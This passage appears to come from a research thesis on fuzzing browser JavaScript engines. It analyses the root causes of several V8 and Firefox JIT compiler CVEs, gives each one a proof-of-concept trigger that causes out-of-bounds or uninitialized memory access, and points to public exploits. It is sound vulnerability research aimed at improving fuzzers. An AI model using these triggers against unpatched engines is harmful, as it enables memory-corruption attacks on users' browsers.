03:     tmp[0] = tmp; 
04:     return tmp[0];   
05: } 
06: for (let i = 0; i < 0x1000; i++) { 
07:     opt();      // Trigger optimization 
08: } 
09: print(opt());   // deref uninitialized stack pointer 
The loop in line 6 triggers the optimization of the opt function. The compiler incorrectly 
assumes that the tmp variable from line 2 cannot escape and allocates the variable on the 
stack instead of the heap. However, line 3 writes to index zero a pointer to itself and returns 
in line 4 this element. The compiler developers just handled the basic case in which a 
variable was directly returned to escape the context. However, the developers forgot to 
implement the case where the pointer was returned via an object property. 
This means, that a pointer to a stack-allocated object can be leaked. After the function 
returns, the object can be accessed although the stack frame is no longer valid. 
Generalization for variation analysis: 
• 
A fuzzer should create code which attempts to escape local objects. After the function 
returns, the return value should be accessed to check for possible escape analysis 
bugs. Before this access is performed, additional stack allocations should be done to 
overwrite the stack frame. 
184 https://bugs.chromium.org/p/project-zero/issues/detail?id=1396 
 100 
Chromium issue 765433, CVE-2017-5121 – Escape analysis bug leads to uninitialized 
memory 
01: var func0 = function (f) { 
02:     var o = { 
03:         a: {}, 
04:         b: { 
05:             ba: { baa: 0, bab: [] }, 
06:             bb: {}, 
07:             bc: { 
08:                 bca: { 
09:                     bcaa: 0, 
10:                     bcab: 0, 
11:                     bcac: this 
12:                 } 
13:             } 
14:         } 
15:     }; 
16:     o.b.bc.bca.bcab = 0; 
18:     // o.b.bb.bba = Object.toString(o.b.ba.bab); 
19:     o.b.bb.bba = Array.prototype.slice.apply(o.b.ba.bab);  
20: }; 
21: while (true) func0(); 
“One of the disadvantages of fuzzing, compared to manual code review, is that it’s not 
always immediately clear what causes a given test case to trigger a vulnerability, or if the 
unexpected behavior even constitutes a vulnerability at all. [...] The code above looks 
strange and doesn’t really achieve anything, but it is valid JavaScript.” 185 
For the above test case the compiler generated code which did not initialize the o.a.b.ba 
property. Initially, the sea-of-nodes graph contained code to initialize the field, however, 
during escape analysis the compiler incorrectly decided that the initialization code is not 
required and removed it. To fix the vulnerability the developers enabled a completely 
rewritten escape analysis phase. The root cause of the vulnerability was therefore never 
analyzed in-depth by a public available source. 
Exploitation details can be found in a blog post 186 published by the Microsoft Offensive 
Security research team.  
Generalization for variation analysis: 
• 
A fuzzer should create such deep, interleaved object structures and use the 
properties during fuzzing. 
185 https://www.microsoft.com/security/blog/2017/10/18/browser-security-beyond-sandboxing/ 
186 https://www.microsoft.com/security/blog/2017/10/18/browser-security-beyond-sandboxing/ 
 101 
Chromium issue 744584, CVE-2017-5115 – Incorrect typing of phi nodes after merge 
in escape analysis 
01: function opt(arg_value) { 
02:     var o = { a: 0 }; //required to trigger the optimization in the escape analysis 
03:     var l = [1.1, 2.2, 3.3, 4.4];  // this array will be accessed OOB 
04:     var result; 
05:     for (var i = 0; i < 3; ++i) { 
06:         if (arg_value % 2 == 0) { o.a = 1; b = false } // creates a merge node 
07:         result = l[o.a]; // OOB access during 2nd loop iteration (in compiled code) 
08:         o.a = arg_value; // this value is incorrectly ignored by the compiler 
09:     } 
10:     return result; 
11: } 
12: opt(0);     // Let intepreter collect feedback for value 0 
13: opt(1);     // Let intepreter collect feedback for value 1 
14: opt(0);     // Let intepreter collect feedback for value 0 
15: opt(1);     // Let intepreter collect feedback for value 1 
16: %OptimizeFunctionOnNextCall(opt);  // Trigger optimization 
17: opt(101);    // this leads to OOB access 
Whereas the above-mentioned examples lead to an escape of a dematerialized object, this 
vulnerability triggers a bug in the escape analysis phase which sets an incorrect range type. 
This leads to the removal of a bound check in the subsequent simplified lowering phase. The 
vulnerability occurs in line 7, where the double array is accessed via an index. The index 
value depends on the output of the previous if branch. When such a branch occurs, the 
engine adds a merge node to the sea-of-nodes to merge both execution paths of the if-
condition back to a single node. To merge the possible values a phi node gets added which 
calculates the possible value range of the o.a variable. 
The vulnerability occurs in the calculation of this range because the code iterates over both 
branches and merges the value ranges. In the true branch, see line 6, the value of o.a is one 
and in the false branch the value is not changed and therefore still zero because it was 
initialized to zero in line 2. The compiler therefore concludes that o.a can just be zero or one 
and therefore that the bound check from the array access in line 7 can be removed in the 
simplified lowering phase. However, the compiler did not consider that the code can be 
wrapped in a loop as done in line 5. After the first iteration finishes, the o.a value is set to the 
passed argument in line 8 which means o.a can have an arbitrary value in the second 
iteration which leads to OOB access because of the removed bound check. 
The bug was reported by a JavaScript developer who observed the flaw in his own code. 
The reporter did not notice that the bug was a security related vulnerability. The bug was two 
years later exploited as a practical exercise by a user named 0x4848 187.  
Generalization for variation analysis: 
• 
A fuzzer should create test cases with interleaved control flow structures such as 
loops and if conditions. 
187 https://zon8.re/posts/exploiting-an-accidentally-discovered-v8-rce/ 
 102 
• 
A fuzzer should create loops in which an array access operation is performed at the 
beginning and in which the index is modified afterwards, as shown in line 7 and 8. 
• 
A fuzzer should create if-conditions followed by array access operations. Within the 
true branch the index of the array access operation should be modified, as shown in 
line 6 and 7. 
• 
The above PoC just works if the --no-turbo-loop-peeling flag is passed to v8. The test 
case can be modified to trigger the bug without this flag, however, then the test case 
188 becomes a lot more complex. Since a more complex test case is harder to find 
with a fuzzer, the fuzzer should try to randomly pass different v8 flags which modify 
JIT optimization phases. 
• 
In the above PoC it is important that the index is stored in a property of a 
dematerialized object, see line 2. Otherwise, the vulnerability would not be triggered 
because of earlier optimization phases. A fuzzer should therefore occasionally wrap 
array index calculations within properties of dematerialized objects. 
• 
Another technique to prevent early optimization is to perform an additional binary 
operation on the index before the array access happens. An example is shown in the 
following code: 
idx &= 0xfff; 
var x = arr[idx]; 
Such code should be used during fuzzing. 
• 
The above PoC creates in line 3 a double array and therefore interprets in line 7 the 
OOB data as a double value. This is useful during exploitation because it can be 
used to leak object pointers. However, it is not useful during fuzzing because the 
OOB access does not lead to a crash and the fuzzer would therefore not notice that 
an OOB access happened. The vulnerability would therefore not be detected - not 
even with an ASAN build because v8 uses a custom heap. By changing line 3 to just 
store SMI values, the code can easily be transformed to a crashing test case when 
a build of v8 is used where debug checks are enabled. A fuzzer should therefore 
mainly try to create SMI arrays when it generates such OOB access test cases. 
188 https://chromium.googlesource.com/v8/v8.git/+/a224eff455632df89377748421a23be47a5278e8/ 
test/mjsunit/ compiler/escape-analysis-phi-type-2.js 
 103 
4.5.6 Implementation bugs 
This chapter explains implementation bugs in code associated with optimization. 
Examples: 
Firefox bug 1493903, CVE-2018-12387 (Hack2Win 2018; exploited together with CVE-
2018-12386) – Misaligned stack pointer because of Array.prototype.push() bailout 
01: function opt(o) { 
02:     var a = [o]; 
03:     a.length = a[0]; 
04:     var useless = function () { } 
05:     var sz = Array.prototype.push.call(a, 42, 43); 
06:     (function () { 
07:         sz; 
08:     })(new Boolean(false)); 
09: } 
10: for (var i = 0; i < 25000; i++) { 
11:     opt(1); // Trigger optimization 
12: } 
13: opt(2);     // Trigger bug 
In line 11 optimization of the opt function is triggered. In this function the push function is 
called in line 5 with two arguments, 42 and 43. The compiler replaces the call with two 
separated inlined push instructions, one for each value. When one is passed as argument 
to opt(), see line 11, the length of the variable a becomes one because of line 3. This means 
that the push instructions do not lead to a deoptimization. However, when the bug is triggered 
in line 13, the value two is passed which means the second entry in the array is undefined. 
The reason for this is that line 3 modifies the length to two, but only the element at index 
zero was assigned in line 2. 
Because of this, the optimized push code cannot handle the data and deoptimization is 
triggered. This means that the interpreter continues execution. However, during 
deoptimization the stack pointer does not get adjusted back to compensate the push 
instructions leading to a stack pointer being off by eight bytes. 
The vulnerability was exploited together with CVE-2018-12386 in Hack2Win 2018. 
Exploitation details are available at 189. An exploit is available at 190. 
Generalization for variation analysis: 
• 
A fuzzer should use the .call() syntax on built-in functions and pass multiple 
arguments. 
• 
A fuzzer should create test cases where the length of a local array is set to a value 
passed as argument. The function should be called multiple times with different 
argument values and the function should perform operations on the array, as shown 
in line 5 with the push call. 
189 https://ssd-disclosure.com/archives/3766/ssd-advisory-firefox-information-leak 
190 https://github.com/phoenhex/files/blob/master/exploits/hack2win2018-firefox-infoleak/exploit.html 
 104 
Firefox bug 1528829, CVE-2019-9793 – Incorrect range inference in loop because of 
integer overflow / truncation 
01: function opt(o) { 
02:     o += 100;                                 // [INT_MIN + 100, ?] 
03:     o += (-2147483647);                       // [?, 0] 
04:     let str = "a"; let res; 
05:     for (var i = 0; i < 1; ++i) { 
06:         // phi corresponding to o is inferred as [INT_MIN, 0] 
07:         let idx = Math.max(0, o);             // [0, 0] 
08:         res = str.charCodeAt(idx);            // OOB access when o := 2147483647 
09:         o = o - 1; 
10:     } 
11:     return res; 
12: } 
13: for (var i = 0; i < 30; i++) { 
14:     opt(4);                                   // Trigger optimization 
15: } 
16: print('Leaked: ' + opt(2147483647)); 
The function is optimized for the case of a small integer argument as it gets called with the 
value four in line 14. During the range analysis phase during JIT compilation the possible 
ranges are calculated as noted in the comments. The argument o has initially the value range 
[INT_MIN, INT_MAX]. If another object is passed as argument, deoptimization would occur. 
After adding 100 to the argument in line 2, the range becomes [INT_MIN + 100, ?]. The 
question mark corresponds to the case of a potential under- or overflow. However, the 
maximum value can still be considered to be equal or below INT_MAX in the next line 
because otherwise deoptimization would occur. After adding -2,147,483,647 (-INT_MAX), 
the range changes to [?,0]. 
The range of the o variable inside the loop depends on the initial range before the loop starts 
and the range of o at the end an iteration. These two possible ranges must be merged to 
estimate the range of o in the loop. This merging must be done although just one iteration is 
performed because the compiler does not know how many iterations will be done at runtime. 
Merging the ranges is performed by the LoopPhi operation. This operation assumes that an 
underflow could not occur because otherwise deoptimization would first happen and 
therefore changes the range to [INT_MIN,0]. After calling the Math.max() function on the 
object, the range of idx becomes [0,0] and the compiler therefore assumes that the index 
is always zero. Since the string str has a length of one, accessing index zero is always safe 
and therefore bound checks can be removed during optimization. 
This implementation would be safe if all assumptions hold. However, this is not the case. In 
a later optimization phase arithmetic folding is performed which merges the two add 
operations from line 2 and 3 into a single add operation. As a result, passing 2,147,483,647 
as argument does not lead to an under- or overflow and therefore the range truncation from 
the question marks to INT_MIN or INT_MAX is incorrect. Out of bound access is therefore 
possible because the bound check was incorrectly removed. 
 105 
Generalization for variation analysis: 
• 
Wrapping code in a loop with just one iteration can yield new bugs during fuzzing. 
Although the JavaScript code is semantic similar to code without a loop, it still affects 
JIT optimization because the additional LoopPhi operation is performed to merge 
ranges. 
• 
Adding Math.max(index,0) or Math.min(index,0) in front of array access 
operations can help to identify range calculation flaws. 
4.6 Not covered vulnerabilities 
The following vulnerabilities have exploits public available or were exploited in-the-wild. 
However, they are not further discussed because of the following reasons. 
Vulnerabilities in third-party code: 
• 
CVE-2019-13720 was a 0day used in-the-wild in operation WizardOpium191. The bug is 
not discussed because it is in the audio module of the browser. A public exploit is 
available in the bug tracker 192.  
• 
The Magellan bug, a vulnerability in SQLite which affected Google Chrome, is not 
discussed since it is a bug in a third-party library. A detailed writeup can be found in 193. 
• 
Firefox bug 1446062 (CVE-2018-5146; Pwn2Own 2018) is a vulnerability in the Vorbis 
audio codec parser. Exploitation details are available at 194 and at 195. 
Vulnerabilities in WebAssembly or asm.js: 
• 
Chromium issue 766260 (CVE-2017-15401; Pwnium full Chrome OS exploit chain) 
because the vulnerability is in WebAssembly. 
• 
Chromium issue 980475 (2019) because the vulnerability is in WebAssembly. 
• 
Chromium issue 759624 (CVE-2017-5116, Android Security Rewards ASR) because the 
vulnerability is in WebAssembly. Exploitation details are available at 196. 
• 
Chromium issue 836141 (CVE-2018-6122) because the vulnerability is in WebAssembly. 
• 
Firefox bug 1145255 (CVE-2015-0817; Pwn2Own 2015) because the vulnerability is in 
asm.js. 
Specific or complex vulnerabilities: 
• 
Chromium issue 931640 (2019) is not discussed because it is a very specific 
vulnerability.  
• 
Chromium issue 905940 (CVE-2018-17480; Tianfu Cup 2018) is complex and therefore 
generalization is not easily possible. 
191 https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/ 